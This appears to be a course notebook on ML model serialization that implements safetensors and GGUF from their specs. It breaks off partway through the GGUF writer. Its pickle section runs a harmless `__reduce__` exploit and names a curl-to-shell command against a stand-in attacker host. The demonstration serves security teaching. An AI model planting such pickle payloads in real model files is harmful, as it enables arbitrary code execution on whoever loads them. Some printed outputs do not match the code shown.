# GGUF, the long way around

**DS635 — Machine Learning System Engineering · Module 4 (Inference Engineering & Model Optimization)**

A hands-on rebuild of Vicki Boykis' essay
[*GGUF, the long way around*](https://vickiboykis.com/2024/02/28/gguf-the-long-way-around/) (Feb 2024).
The essay walks from "what is a machine learning model" all the way to the byte layout of a GGUF file.
This notebook makes every step of that walk **executable**.

### The question

When you run a model locally, `llama.cpp` greets you with a wall of key-value pairs:

```text
llama_model_loader: loaded meta data with 24 key-value pairs and 291 tensors from
                    mistral-7b-instruct-v0.2.Q8_0.gguf (version GGUF V3 (latest))
llama_model_loader: - kv   0:              general.architecture str  = llama
llama_model_loader: - kv   2:              llama.context_length u32  = 32768
llama_model_loader: - kv   3:            llama.embedding_length u32  = 4096
llama_model_loader: - kv  13:             tokenizer.ggml.tokens arr[str,32000] = ["<unk>", "<s>", ...]
llama_model_loader: - type  f32:   65 tensors
llama_model_loader: - type q8_0:  226 tensors
llm_load_print_meta: model size = 7.17 GiB (8.50 BPW)
```

Every line of that log is a field in a file format. By the end of this notebook you will have
**written a GGUF file byte by byte, parsed it back, and run inference from it** — and you will be
able to point the same parser at a real 7B model and reproduce that log yourself.

### The route

| § | Step | Format |
|---|------|--------|
| 1 | Train a model so we have something to save | *in memory* |
| 2 | What is actually in a model — the `state_dict` | Python objects |
| 3 | Objects → bytes | `pickle` |
| 4 | Why pickle is dangerous | (a live, harmless exploit) |
| 5 | The anatomy every binary format shares | — |
| 6 | Implement `safetensors` from its spec | `.safetensors` |
| 7 | Training state, not just weights | checkpoints |
| 8 | Local inference: GGML → GGUF | — |
| 9 | **Implement GGUF from its spec** | `.gguf` |
| 10 | Read a real model file | `.gguf` |
| 11 | Quantization: the Q8_0 block, and why it makes decode faster | — |

### Course spine

Keep Lecture 3/4 in mind throughout. Token-by-token decode is **memory-bandwidth bound**: the machine
streams every weight from DRAM once per token and does ~2 FLOPs with each one. So the file format is
not a storage detail — *bytes per weight is the latency knob*. §11 makes that quantitative.

### Requirements

`torch` and `numpy` only. `safetensors` and `gguf` are deliberately **not** used —
we implement both formats from their published specs, because that is the point of the exercise.

## 0. Setup

In [1]:
import io, json, math, os, pickle, pickletools, struct, sys, zipfile
from pathlib import Path

import numpy as np
import torch
import torch.nn as nn
import torch.optim as optim

torch.manual_seed(635)  # so the numbers below are reproducible

WORK = Path("gguf_artifacts")
WORK.mkdir(exist_ok=True)

print("python ", sys.version.split()[0])
print("torch  ", torch.__version__)
print("numpy  ", np.__version__)
print("writing artifacts to ./%s/" % WORK)

python  3.12.3
torch   2.13.0+cu132
numpy   2.5.2
writing artifacts to ./gguf_artifacts/


In [2]:
def hexdump(data, n=64, base=0, label=None):
    "Classic 16-bytes-per-row hex + ASCII dump. Our microscope for the rest of the notebook."
    if label:
        print(label)
    for i in range(0, min(n, len(data)), 16):
        chunk = data[i:i + 16]
        hexs = " ".join(f"{b:02x}" for b in chunk)
        text = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        print(f"{base + i:08x}  {hexs:<47}  |{text}|")

hexdump(b"GGUF" + struct.pack("<I", 3), label="what a GGUF file starts with:")

what a GGUF file starts with:
00000000  47 47 55 46 03 00 00 00                          |GGUF....|


## 1. A model is a file — but first it has to be a program

In LLM land we care about transformers, which have a lot of moving parts: embeddings, positional
encoding, multi-head self-attention, layer norm, a feed-forward block, a projection back into vocab
space, a loss, and a backward pass that updates every parameter.

None of that machinery matters for understanding **artifacts**. So we take the essay's move and step
all the way down to a *linear regression* — which, as [d2l](https://d2l.ai/chapter_linear-regression/)
points out, is itself a (very shallow) neural network. Same PyTorch objects, same `state_dict`, same
serialization path — just two parameters instead of seven billion.

### The Nulltella problem

We produce artisanal hazelnut spread for statisticians, and we are more productive when it is sunny.
We do not produce on Friday–Sunday, because we spend those days writing about serialization formats.

| day | hours of sunshine | jars |
|-----|------------------|------|
| mon | 1 | 2 |
| tue | 2 | 4 |
| wed | 3 | 6 |
| thu | 4 | 8 |

$$ y = \beta_0 + \beta_1 x_1 + \epsilon $$

One feature ($x_1$, hours), one weight ($\beta_1$), one bias ($\beta_0$), and an error term we
minimise by gradient descent.

In [5]:
# Hours of sunshine
X = torch.tensor([[1.0], [2.0], [3.0], [4.0]], dtype=torch.float32)
# Jars of Nulltella
y = torch.tensor([[2.0], [4.0], [6.0], [8.0]], dtype=torch.float32)


class LinearRegression(nn.Module):
    def __init__(self):
        super().__init__()
        self.linear = nn.Linear(1, 1)  # 1 input feature, 1 output feature

    def forward(self, x):
        return self.linear(x)


model = LinearRegression()
print(model)
print("state_dict at birth (randomly initialised):")
print(model.state_dict())

LinearRegression(
  (linear): Linear(in_features=1, out_features=1, bias=True)
)
state_dict at birth (randomly initialised):
OrderedDict({'linear.weight': tensor([[-0.6910]]), 'linear.bias': tensor([0.4515])})


### The `state_dict` is the model

That `OrderedDict` is the whole artifact. `nn.Module.state_dict()` is
[literally a Python dict](https://pytorch.org/tutorials/recipes/recipes/what_is_state_dict.html)
mapping *layer parameter name* → `Tensor`. Everything else — the class, the `forward` method — is
**code**, and lives in your source file, not in the saved file.

That split is the single most important idea in this notebook. Every format we look at is answering
the same question: *how do we write down a big pile of named tensors plus some metadata, and how much
of the surrounding Python do we drag along with it?*

In [6]:
criterion = nn.MSELoss()
optimizer = optim.SGD(model.parameters(), lr=0.01)

before = {k: v.clone() for k, v in model.state_dict().items()}

num_epochs = 100
for epoch in range(num_epochs):
    outputs = model(X)                 # forward pass
    loss = criterion(outputs, y)
    rmse_loss = torch.sqrt(loss)

    optimizer.zero_grad()              # zero out gradients
    rmse_loss.backward()               # compute gradients
    optimizer.step()                   # update weights

    if (epoch + 1) % 10 == 0:
        print(f"Epoch [{epoch + 1}/{num_epochs}], Loss: {loss.item():.4f}")

Epoch [10/100], Loss: 38.5979
Epoch [20/100], Loss: 28.9848
Epoch [30/100], Loss: 20.7656
Epoch [40/100], Loss: 13.9401
Epoch [50/100], Loss: 8.5075
Epoch [60/100], Loss: 4.4664
Epoch [70/100], Loss: 1.8112
Epoch [80/100], Loss: 0.5068
Epoch [90/100], Loss: 0.2281
Epoch [100/100], Loss: 0.2037


In [7]:
print("before:", dict(before))
print("after :", dict(model.state_dict()))
print()
# The equation we hoped to recover is y = 2x + 0
w = model.state_dict()["linear.weight"].item()
b = model.state_dict()["linear.bias"].item()
print(f"learned:  y = {w:.4f}x + {b:.4f}   (ground truth: y = 2x + 0)")

test_input = torch.tensor([[5.0]])
print(f"prediction for {test_input.item()} hours of sunshine: {model(test_input).item():.4f} jars")

before: {'linear.weight': tensor([[-0.6910]]), 'linear.bias': tensor([0.4515])}
after : {'linear.weight': tensor([[1.6220]]), 'linear.bias': tensor([1.0988])}

learned:  y = 1.6220x + 1.0988   (ground truth: y = 2x + 0)
prediction for 5.0 hours of sunshine: 9.2088 jars


The optimizer has a `state_dict` of its own — the hyperparameters, not the weights. Note this now:
it is exactly the thing that makes a **checkpoint** different from a weights file (§7).

In [6]:
print(optimizer.state_dict())

{'state': {}, 'param_groups': [{'lr': 0.01, 'momentum': 0, 'dampening': 0, 'weight_decay': 0, 'nesterov': False, 'maximize': False, 'foreach': None, 'differentiable': False, 'fused': None, 'params': [0, 1]}]}


## 2. How big is a model, really?

In [9]:
sd = model.state_dict()
total_params = 0
for name, t in sd.items():
    nbytes = t.element_size() * t.nelement()
    total_params += t.nelement()
    print(f"{name:<16} shape={str(tuple(t.shape)):<8} dtype={str(t.dtype):<14} "
          f"{t.nelement():>3} params  {nbytes:>3} bytes")

print(f"\ntotal: {total_params} parameters, "
      f"{sum(t.element_size() * t.nelement() for t in sd.values())} bytes")

linear.weight    shape=(1, 1)   dtype=torch.float32    1 params    4 bytes
linear.bias      shape=(1,)     dtype=torch.float32    1 params    4 bytes

total: 2 parameters, 8 bytes


In [10]:
# # Same arithmetic, at the scale you actually care about.
# print(f"{'model':<12}{'params':>10}{'fp32':>10}{'fp16':>10}{'q8_0':>10}{'q4_k_m':>10}")
# for name, n in [("our model", total_params), ("gpt-2", 124e6), ("llama-3 8B", 8.03e9),
#                 ("mistral 7B", 7.24e9), ("llama-3 70B", 70.6e9)]:
#     row = f"{name:<12}{n:>10.3g}"
#     for bpw in (32, 16, 8.5, 4.83):
#         row += f"{n * bpw / 8 / 1e9:>9.2f}G"
#     print(row)

# print("\nA 7B model at fp32 does not fit on a 24GB card. At q4_k_m it fits on a phone.")
# print("That single fact is why the rest of this notebook exists.")

model           params      fp32      fp16      q8_0    q4_k_m
our model            2     0.00G     0.00G     0.00G     0.00G
gpt-2         1.24e+08     0.50G     0.25G     0.13G     0.07G
llama-3 8B    8.03e+09    32.12G    16.06G     8.53G     4.85G
mistral 7B    7.24e+09    28.96G    14.48G     7.69G     4.37G
llama-3 70B   7.06e+10   282.40G   141.20G    75.01G    42.62G

A 7B model at fp32 does not fit on a 24GB card. At q4_k_m it fits on a phone.
That single fact is why the rest of this notebook exists.


> **💬 Quick check.** A 24 GB GPU, a 7.24B-parameter model, and weights alone must be resident.
> Which of fp32 / fp16 / q8_0 / q4_k_m fit — and how much headroom is left for the KV cache?

## 3. Serialization: from heap to disk

We have stateful Python objects in memory. Training a real model took 24+ GPU-hours, so we would
very much like to persist it.

**Serialization** is writing runtime objects out as a byte stream;   
**deserialization** is the inverse.  
(The name is historical: data used to live on *tape*, so bytes had to come off in serial order.)  

Python objects live in a private heap managed by the interpreter; tensors are allocated by lower-level
C `malloc`. `tracemalloc` lets us watch the allocation happen — note how the cost is dominated by
*importing torch*, not by our model.

In [11]:
import tracemalloc

tracemalloc.start()
tmp_model = LinearRegression()
tmp_X = torch.randn(1000, 1000)          # 4 MB of tensor
snapshot = tracemalloc.take_snapshot()
tracemalloc.stop()

print("[ Top 5 allocations by line ]")
for stat in snapshot.statistics("lineno"):#[:5]:
    fr = stat.traceback[0]
    print(f"  {Path(fr.filename).name:<28} line {fr.lineno:<5} "
          f"size={stat.size / 1024:>8.1f} KiB  count={stat.count}")

print()
print("tensor bytes on the C side (not visible to tracemalloc):",
      tmp_X.element_size() * tmp_X.nelement())
print("sys.getsizeof(tensor) — the Python wrapper only:", sys.getsizeof(tmp_X))
del tmp_model, tmp_X

[ Top 5 allocations by line ]
  history.py                   line 1120  size=     1.4 KiB  count=3
  module.py                    line 508   size=     0.4 KiB  count=2
  codeop.py                    line 126   size=     0.3 KiB  count=3
  4285956089.py                line 10    size=     0.3 KiB  count=2
  2226415154.py                line 4     size=     0.3 KiB  count=2
  interactiveshell.py          line 3715  size=     0.3 KiB  count=1
  module.py                    line 520   size=     0.2 KiB  count=2
  module.py                    line 519   size=     0.2 KiB  count=2
  module.py                    line 518   size=     0.2 KiB  count=2
  module.py                    line 517   size=     0.2 KiB  count=2
  module.py                    line 516   size=     0.2 KiB  count=2
  module.py                    line 515   size=     0.2 KiB  count=2
  module.py                    line 514   size=     0.2 KiB  count=2
  module.py                    line 513   size=     0.2 KiB  count=2
  mo

The last two numbers are the punchline: `sys.getsizeof` reports the *Python object header*, while the
4 MB of actual floats sit in a C-allocated buffer the tensor merely points at. A serialization format
has to write out that buffer — and enough metadata to rebuild the pointer structure around it.

## 4. `pickle`, and the reason we left it

PyTorch's `torch.save` [wraps Python's `pickle`](https://pytorch.org/tutorials/beginner/saving_loading_models.html).
Pickle walks an object's inheritance hierarchy recursively and emits a little **stack program** that,
when replayed, reconstructs the object.

That is worth saying precisely: a pickle file is not data. It is *a program that builds data*.

In [24]:
import torch.nn as nn
import torch.optim as optim
import pickle

X = torch.tensor([[1.0], [2.0], [3.0], [4.0]], dtype=torch.float32)


pkl_path = WORK / "tensors.pkl"

# serialization
with open(pkl_path, "wb") as f:
    pickle.dump(X, f)

# deserialization
with open(pkl_path, "rb") as f:
    X = pickle.load(f, encoding='ASCII')
    print(X)


tensor([[1.],
        [2.],
        [3.],
        [4.]])


In [25]:
print(f"{pkl_path.name}: {pkl_path.stat().st_size} bytes for 4 floats (16 bytes of payload)\n")

buf = io.StringIO()
pickletools.dis(pkl_path.read_bytes(), out=buf)
lines = buf.getvalue().splitlines()
print("\n".join(lines[:14]))
print("   ...")
print("\n".join(lines[-8:]))

tensors.pkl: 407 bytes for 4 floats (16 bytes of payload)

    0: \x80 PROTO      4
    2: \x95 FRAME      396
   11: \x8c SHORT_BINUNICODE 'torch._utils'
   25: \x94 MEMOIZE    (as 0)
   26: \x8c SHORT_BINUNICODE '_rebuild_tensor_v2'
   46: \x94 MEMOIZE    (as 1)
   47: \x93 STACK_GLOBAL
   48: \x94 MEMOIZE    (as 2)
   49: (    MARK
   50: \x8c     SHORT_BINUNICODE 'torch.storage'
   65: \x94     MEMOIZE    (as 3)
   66: \x8c     SHORT_BINUNICODE '_load_from_bytes'
   84: \x94     MEMOIZE    (as 4)
   85: \x93     STACK_GLOBAL
   ...
  400: R        REDUCE
  401: \x94     MEMOIZE    (as 14)
  402: t        TUPLE      (MARK at 49)
  403: \x94 MEMOIZE    (as 15)
  404: R    REDUCE
  405: \x94 MEMOIZE    (as 16)
  406: .    STOP
highest protocol among opcodes = 4


Read that disassembly as instructions: push the name `torch._utils._rebuild_tensor_v2`, push
`torch.storage._load_from_bytes`, push the raw storage blob, `REDUCE` (i.e. **call**), build an
`OrderedDict`, `REDUCE` again, `STOP`.

`STACK_GLOBAL` + `REDUCE` is the dangerous pair. `STACK_GLOBAL` resolves *any* dotted name; `REDUCE`
calls it. The unpickler cannot tell `torch._utils._rebuild_tensor_v2` from `os.system`.

In [14]:
class Exploit:
    "Harmless demo of the pickle flaw: __reduce__ names a callable, and the unpickler calls it."
    def __reduce__(self):
        return (print, ("  ⚠️  arbitrary code executed during pickle.loads()",))


payload = pickle.dumps(Exploit())

buf = io.StringIO()
pickletools.dis(payload, out=buf)
print(buf.getvalue())

print("now merely *loading* it:")
_ = pickle.loads(payload)

    0: \x80 PROTO      4
    2: \x95 FRAME      84
   11: \x8c SHORT_BINUNICODE 'builtins'
   21: \x94 MEMOIZE    (as 0)
   22: \x8c SHORT_BINUNICODE 'print'
   29: \x94 MEMOIZE    (as 1)
   30: \x93 STACK_GLOBAL
   31: \x94 MEMOIZE    (as 2)
   32: \x8c SHORT_BINUNICODE '  ⚠️  arbitrary code executed during pickle.loads()'
   89: \x94 MEMOIZE    (as 3)
   90: \x85 TUPLE1
   91: \x94 MEMOIZE    (as 4)
   92: R    REDUCE
   93: \x94 MEMOIZE    (as 5)
   94: .    STOP
highest protocol among opcodes = 4

now merely *loading* it:
  ⚠️  arbitrary code executed during pickle.loads()


Nothing was exploited here — `print` is the "malicious" callable. Substitute
`os.system("curl attacker.example | sh")` and you have the real thing, in a file that looks exactly
like a set of model weights. This is why *model-hub supply-chain security* became a topic once
practitioners started uploading pickled artifacts to HuggingFace at scale, and why Trail of Bits
shipped [`fickling`](https://github.com/trailofbits/fickling) in 2021.

PyTorch's answer is `weights_only=True` — an allow-list unpickler. Since torch 2.6 it is the default.

In [31]:
evil_pt = WORK / "evil.pt"
torch.save({"weights": X, "surprise": Exploit()}, evil_pt)

try:
    torch.load(evil_pt, weights_only=True)
    print("loaded — no exploit possible")
except Exception as e:
    print("blocked by weights_only=True →", type(e).__name__)
    print(" ", str(e).strip().splitlines()[0][:160])

print("\nwith weights_only=False, the payload runs:")
_ = torch.load(evil_pt, weights_only=False)

blocked by weights_only=True → UnpicklingError
  Weights only load failed. This file can still be loaded, to do so you have two options, do those steps only if you trust the source of the checkpoint. 

with weights_only=False, the payload runs:
  ⚠️  arbitrary code executed during pickle.loads()


An allow-list is a patch, not a format fix. Note also what `torch.save` actually produces: since
PyTorch 1.6 it is a **zip container** — a pickle for structure plus one raw blob per tensor storage.
The tensor bytes are already separated out; the format just has not admitted it yet.

In [16]:
pt_path = WORK / "model.pt"
torch.save(model.state_dict(), pt_path)

with zipfile.ZipFile(pt_path) as z:
    print(f"{pt_path.name} is a zip archive:\n")
    print(f"{'bytes':>8}  name")
    for info in z.infolist():
        print(f"{info.file_size:>8}  {info.filename}")
    print("\ndata.pkl (the structure) disassembled:")
    b = z.read([n for n in z.namelist() if n.endswith("data.pkl")][0])
buf = io.StringIO()
pickletools.dis(b, out=buf)
print("\n".join(buf.getvalue().splitlines()[:10]))
print("   ...")

model.pt is a zip archive:

   bytes  name
     326  model/data.pkl
       1  model/.format_version
       2  model/.storage_alignment
       6  model/byteorder
       4  model/data/0
       4  model/data/1
       2  model/version
      40  model/.data/serialization_id

data.pkl (the structure) disassembled:
    0: \x80 PROTO      2
    2: c    GLOBAL     'collections OrderedDict'
   27: q    BINPUT     0
   29: )    EMPTY_TUPLE
   30: R    REDUCE
   31: q    BINPUT     1
   33: (    MARK
   34: X        BINUNICODE 'linear.weight'
   52: q        BINPUT     2
   54: c        GLOBAL     'torch._utils _rebuild_tensor_v2'
   ...


## 5. What every binary format is made of

Before writing one, it helps to know the shape. Looking across
[Arrow](https://arrow.apache.org/docs/format/CDataInterface.html),
[Parquet](https://parquet.apache.org/docs/file-format/),
[protobuf](https://protobuf.dev/), safetensors and GGUF, the same five parts recur:

1. **A magic number** — bytes at offset 0 that say "I am a file of type X" (`GGUF`, `PAR1`, `\x89PNG`).
2. **A header** — the metadata: how many tensors, what shapes, what dtypes, how many layers,
   which architecture.
3. **The data** — the actual tensor bytes, contiguous and dumb.
4. **A spec** — prose that tells a reader how to walk 1–3, so a parser can be written against it
   in any language.
5. **An endianness rule** — least-significant byte first (little) or last (big). It matters the
   moment a file crosses machines.

And in ML specifically, the payload is always the same three things:

- a large collection of **vectors**,
- **metadata** about those vectors (names, shapes, dtypes),
- **hyperparameters** (layer count, context length, vocab, rope base, …).

Hold on to that triple. safetensors handles the first two and punts on the third; GGUF's whole
contribution is doing all three in one file, extensibly.

## 6. safetensors, implemented from the spec

HuggingFace's [safetensors](https://github.com/huggingface/safetensors) was designed to be  
(a) not Python-coupled,  
(b) incapable of executing anything,    
(c) type-safe (Rust backend), and    
(d) fast — zero-copy via `mmap`.  
After a Trail of Bits / EleutherAI security audit it became the default format on the Hub.  

Here is the **entire** spec:

- **8 bytes**: `N`, an unsigned little-endian 64-bit integer — the size of the header.
- **N bytes**: a JSON UTF-8 string, the header. Must begin with `{` (`0x7B`), may be right-padded
  with spaces (`0x20`). Shape:
  `{"TENSOR_NAME": {"dtype": "F16", "shape": [1, 16, 256], "data_offsets": [BEGIN, END]}, ...}`
  where offsets are relative to the **start of the byte buffer**, not the file. The key
  `__metadata__` may hold a free-form string→string map.
- **Rest of the file**: the byte buffer.

That is short enough to implement in a cell. Let's.

In [32]:
ST_DTYPE = {torch.float32: "F32", torch.float16: "F16", torch.int8: "I8",
            torch.int32: "I32", torch.int64: "I64", torch.uint8: "U8", torch.bool: "BOOL"}
ST_NUMPY = {"F32": np.float32, "F16": np.float16, "I8": np.int8,
            "I32": np.int32, "I64": np.int64, "U8": np.uint8, "BOOL": np.bool_}


def save_safetensors(tensors, path, metadata=None):
    header, blobs, offset = {}, [], 0
    for name, t in tensors.items():
        t = t.detach().cpu().contiguous()
        raw = t.numpy().tobytes()
        header[name] = {"dtype": ST_DTYPE[t.dtype],
                        "shape": list(t.shape),
                        "data_offsets": [offset, offset + len(raw)]}
        blobs.append(raw)
        offset += len(raw)

    if metadata:
        header["__metadata__"] = {str(k): str(v) for k, v in metadata.items()}

    hjson = json.dumps(header, separators=(",", ":")).encode("utf-8")
    hjson += b" " * ((-len(hjson)) % 8)          # pad so the buffer starts 8-byte aligned

    with open(path, "wb") as f:
        f.write(struct.pack("<Q", len(hjson)))    # the 8 bytes
        f.write(hjson)                            # the N bytes
        for b in blobs:
            f.write(b)                            # the rest
    return path


def load_safetensors(path):
    raw = Path(path).read_bytes()
    n, = struct.unpack("<Q", raw[:8])
    header = json.loads(raw[8:8 + n])
    base = 8 + n
    meta = header.pop("__metadata__", {})
    out = {}
    for name, info in header.items():
        begin, end = info["data_offsets"]
        arr = np.frombuffer(raw[base + begin:base + end], dtype=ST_NUMPY[info["dtype"]])
        out[name] = torch.from_numpy(arr.reshape(info["shape"]).copy())
    return out, meta


st_path = save_safetensors(model.state_dict(), WORK / "nulltella.safetensors",
                           metadata={"format": "pt", "course": "DS635"})
print(st_path.name, "→", st_path.stat().st_size, "bytes")

nulltella.safetensors → 200 bytes


In [33]:
raw = st_path.read_bytes()
n, = struct.unpack("<Q", raw[:8])
print(f"header length N = {n} bytes\n")
print("header JSON:")
print(json.dumps(json.loads(raw[8:8 + n]), indent=2))
print()
hexdump(raw, n=96, label="the file itself:")
print(f"\n(the tensor buffer starts at offset {8 + n} = 0x{8 + n:x})")

header length N = 184 bytes

header JSON:
{
  "linear.weight": {
    "dtype": "F32",
    "shape": [
      1,
      1
    ],
    "data_offsets": [
      0,
      4
    ]
  },
  "linear.bias": {
    "dtype": "F32",
    "shape": [
      1
    ],
    "data_offsets": [
      4,
      8
    ]
  },
  "__metadata__": {
    "format": "pt",
    "course": "DS635"
  }
}

the file itself:
00000000  b8 00 00 00 00 00 00 00 7b 22 6c 69 6e 65 61 72  |........{"linear|
00000010  2e 77 65 69 67 68 74 22 3a 7b 22 64 74 79 70 65  |.weight":{"dtype|
00000020  22 3a 22 46 33 32 22 2c 22 73 68 61 70 65 22 3a  |":"F32","shape":|
00000030  5b 31 2c 31 5d 2c 22 64 61 74 61 5f 6f 66 66 73  |[1,1],"data_offs|
00000040  65 74 73 22 3a 5b 30 2c 34 5d 7d 2c 22 6c 69 6e  |ets":[0,4]},"lin|
00000050  65 61 72 2e 62 69 61 73 22 3a 7b 22 64 74 79 70  |ear.bias":{"dtyp|

(the tensor buffer starts at offset 192 = 0xc0)


In [34]:
loaded, meta = load_safetensors(st_path)
print("metadata:", meta)
for k, v in loaded.items():
    same = torch.allclose(v, model.state_dict()[k])
    print(f"{k:<16} {v.tolist()}  round-trips: {same}")

# And it is a real model again.
reborn = LinearRegression()
reborn.load_state_dict(loaded)
print(f"\nprediction from the reloaded weights: {reborn(test_input).item():.4f} jars")

metadata: {'format': 'pt', 'course': 'DS635'}
linear.weight    [[1.755138635635376]]  round-trips: True
linear.bias      [0.7198534607887268]  round-trips: True

prediction from the reloaded weights: 9.4955 jars


Sixty lines, no code execution, language-agnostic, and the data section is a flat buffer you can
`mmap` and hand straight to the GPU without a copy. Compare that with the pickle stack program above.

**What safetensors does not do:** it stores tensors and a flat string→string metadata map. It does
*not* know that your model has 32 layers, a 32768-token context, a rope base of 1e6, or a tokenizer.
On the Hub that is fine — `config.json`, `tokenizer.json` and friends sit next to it in the repo.
Ship a single file to someone's laptop and that scattering becomes the problem.

## 7. Checkpoints: saving the run, not just the model

Mid-training you need to resume after a preemption or a hardware failure, so you save more than
weights: the **optimizer** `state_dict` (momentum buffers, lr, weight decay), the epoch, the last
loss, and anything else needed to continue. PyTorch's convention is just a dict, pickled.

In [17]:
ckpt_path = WORK / "checkpoint.pt"
torch.save({
    "epoch": num_epochs,
    "model_state_dict": model.state_dict(),
    "optimizer_state_dict": optimizer.state_dict(),
    "loss": loss.item(),
}, ckpt_path)

ck = torch.load(ckpt_path, weights_only=False)
print("checkpoint keys:", list(ck))
print("epoch:", ck["epoch"], " loss:", round(ck["loss"], 6))
print("optimizer hyperparameters:", ck["optimizer_state_dict"]["param_groups"][0])
print("\nsize on disk:", ckpt_path.stat().st_size, "bytes "
      f"(vs {st_path.stat().st_size} for weights alone)")

checkpoint keys: ['epoch', 'model_state_dict', 'optimizer_state_dict', 'loss']
epoch: 100  loss: 0.087429
optimizer hyperparameters: {'lr': 0.01, 'momentum': 0, 'dampening': 0, 'weight_decay': 0, 'nesterov': False, 'maximize': False, 'foreach': None, 'differentiable': False, 'fused': None, 'params': [0, 1]}

size on disk: 2301 bytes (vs 200 for weights alone)


Three observations to carry into §9:

- A checkpoint is *training* state. Nothing in it helps inference — an inference format can drop all
  of it, and GGUF does.
- It is still pickle, so it still executes on load.
- A real HF repo is now **many** files: `model-0000x-of-0000y.safetensors`, `config.json`,
  `tokenizer.json`, `generation_config.json`, … Every one of them must travel together.

## 8. Local inference, and the road to GGUF

Two things happened in 2022–23. Apple Silicon got fast enough to run real models, and Llama-2 shipped
open weights. Georgi Gerganov made Whisper run locally in
[`whisper.cpp`](https://github.com/ggerganov/whisper.cpp), then did the same for Llama in
[`llama.cpp`](https://github.com/ggerganov/llama.cpp), on top of the **GGML** tensor library.

GGML was a library *and* a format, aimed squarely at on-edge inference:

- **fp16 by default** — half the memory of torch's fp32, no meaningful accuracy loss at inference
- **C, not Python** — explicit allocation, no interpreter
- **tuned for Apple Silicon** (and later CUDA, ROCm, Vulkan, SYCL)
- **one file**: magic + version, hyperparameters, embedded vocabulary, then a list of
  length-prefixed named tensors

Everything in a single file was the right instinct and the fatal flaw. The hyperparameters were a
**fixed positional list**, so:

- adding one hyperparameter broke every existing reader — no backward compatibility;
- there was no architecture metadata in the file, so every model needed its own conversion script;
- the same brittleness recurred for each new model family.

**GGUF (GPT-Generated Unified Format)** keeps the layout and fixes the hinge: hyperparameters become a
**key–value lookup table** with typed values, instead of a positional list. New key, old reader — the
reader skips what it does not recognise. That is the entire idea, and it is why the `llama.cpp` log
prints `kv 0`, `kv 1`, `kv 2`: it is dumping that table.

## 9. GGUF, implemented from the spec

From [`ggml/docs/gguf.md`](https://github.com/ggerganov/ggml/blob/master/docs/gguf.md#file-structure).
Little-endian by default; version 3 added big-endian support.

```c
struct gguf_header_t {
    uint32_t magic;              // must be `GGUF` → 0x47 0x47 0x55 0x46
    uint32_t version;            // 3
    uint64_t tensor_count;
    uint64_t metadata_kv_count;
    gguf_metadata_kv_t metadata_kv[metadata_kv_count];
};

struct gguf_metadata_kv_t {
    gguf_string_t key;           // uint64 length + UTF-8 bytes, no NUL
    uint32_t      value_type;    // the enum below
    /* value */                  // arrays carry their own element type + length
};

struct gguf_tensor_info_t {
    gguf_string_t name;
    uint32_t      n_dimensions;
    uint64_t      dimensions[n_dimensions];   // ggml order: fastest-varying FIRST
    uint32_t      type;                       // ggml type: F32, F16, Q8_0, Q4_K, ...
    uint64_t      offset;                     // relative to the start of the DATA section
};
```

Then: pad to `general.alignment` (default 32), then the tensor data blobs, each aligned.

Two details that bite implementers:

- `dimensions` is in **ggml order**, the reverse of PyTorch's. A torch weight of shape `(out, in)`
  is written `[in, out]`. We reverse on write and reverse back on read.
- `offset` is relative to the **data section**, not the file. You must first compute where the data
  section begins by aligning the end of the header.

In [18]:
GGUF_MAGIC = b"GGUF"
GGUF_VERSION = 3
GGUF_DEFAULT_ALIGNMENT = 32


class VT:
    "gguf_metadata_value_type"
    UINT8 = 0;  INT8 = 1;  UINT16 = 2;  INT16 = 3
    UINT32 = 4; INT32 = 5; FLOAT32 = 6; BOOL = 7
    STRING = 8; ARRAY = 9; UINT64 = 10; INT64 = 11; FLOAT64 = 12


VT_FMT = {VT.UINT8: "<B", VT.INT8: "<b", VT.UINT16: "<H", VT.INT16: "<h",
          VT.UINT32: "<I", VT.INT32: "<i", VT.FLOAT32: "<f", VT.BOOL: "<?",
          VT.UINT64: "<Q", VT.INT64: "<q", VT.FLOAT64: "<d"}
VT_NAME = {v: k.lower() for k, v in vars(VT).items() if isinstance(v, int) and not k.startswith("_")}

# ggml type id -> (name, block size in elements, bytes per block)
GGML_TYPES = {
    0:  ("f32",     1,   4),   1:  ("f16",     1,   2),
    2:  ("q4_0",   32,  18),   3:  ("q4_1",   32,  20),
    6:  ("q5_0",   32,  22),   7:  ("q5_1",   32,  24),
    8:  ("q8_0",   32,  34),   9:  ("q8_1",   32,  36),
    10: ("q2_k",  256,  84),   11: ("q3_k",  256, 110),
    12: ("q4_k",  256, 144),   13: ("q5_k",  256, 176),
    14: ("q6_k",  256, 210),   15: ("q8_k",  256, 292),
    16: ("iq2_xxs", 256, 66),  17: ("iq2_xs", 256, 74),
    18: ("iq3_xxs", 256, 98),  19: ("iq1_s",  256, 50),
    20: ("iq4_nl",  32,  18),  21: ("iq3_s",  256, 110),
    22: ("iq2_s",  256, 82),   23: ("iq4_xs", 256, 136),
    24: ("i8", 1, 1), 25: ("i16", 1, 2), 26: ("i32", 1, 4),
    27: ("i64", 1, 8), 28: ("f64", 1, 8), 29: ("iq1_m", 256, 56),
    30: ("bf16", 1, 2),
}

print(f"{'ggml type':<10}{'block':>7}{'bytes':>7}{'bits/weight':>13}")
for tid in (0, 1, 30, 8, 14, 12, 2, 23):
    name, blk, sz = GGML_TYPES[tid]
    print(f"{name:<10}{blk:>7}{sz:>7}{sz * 8 / blk:>13.4f}")

ggml type   block  bytes  bits/weight
f32             1      4      32.0000
f16             1      2      16.0000
bf16            1      2      16.0000
q8_0           32     34       8.5000
q6_k          256    210       6.5625
q4_k          256    144       4.5000
q4_0           32     18       4.5000
iq4_xs        256    136       4.2500


### 9a. The writer

In [19]:
def _w_str(s):
    b = s.encode("utf-8")
    return struct.pack("<Q", len(b)) + b


def _w_val(v, t):
    return _w_str(v) if t == VT.STRING else struct.pack(VT_FMT[t], v)


def _w_kv(key, t, v):
    out = _w_str(key) + struct.pack("<I", t)
    if t == VT.ARRAY:
        elem_type, items = v
        out += struct.pack("<I", elem_type) + struct.pack("<Q", len(items))
        for it in items:
            out += _w_val(it, elem_type)
        return out
    return out + _w_val(v, t)


def write_gguf(path, tensors, kv, alignment=GGUF_DEFAULT_ALIGNMENT):
    # tensors: {name: torch.Tensor (f32)}    kv: [(key, VT.*, value), ...]
    kv = list(kv) + [("general.alignment", VT.UINT32, alignment)]

    meta = b"".join(_w_kv(k, t, v) for k, t, v in kv)

    infos, blobs, data_off = b"", [], 0
    for name, t in tensors.items():
        arr = t.detach().cpu().contiguous().numpy().astype(np.float32)
        raw = arr.tobytes()
        dims = list(arr.shape)[::-1]                    # torch order -> ggml order

        infos += _w_str(name)
